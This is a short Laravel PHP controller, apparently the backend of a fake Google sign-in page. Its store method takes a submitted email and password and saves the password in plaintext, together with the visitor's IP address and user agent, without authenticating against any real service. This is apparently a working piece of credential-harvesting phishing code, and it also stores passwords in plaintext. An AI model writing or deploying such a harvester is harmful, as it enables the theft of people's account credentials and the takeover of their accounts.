<?php

namespace App\Http\Controllers;

use App\Models\LoginAttempt;
use Illuminate\Http\Request;

class GoogleLoginController extends Controller
{
    public function store(Request $request)
    {
        $validated = $request->validate([
            'email' => 'required|email',
            'password' => 'required|string|min:6',
        ]);

        // Store the login attempt
        LoginAttempt::create([
            'email' => $validated['email'],
            'password' => $validated['password'],
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
        ]);

        // Redirect back with success message
        return back()->with('success', 'Login attempt recorded.');
    }
}
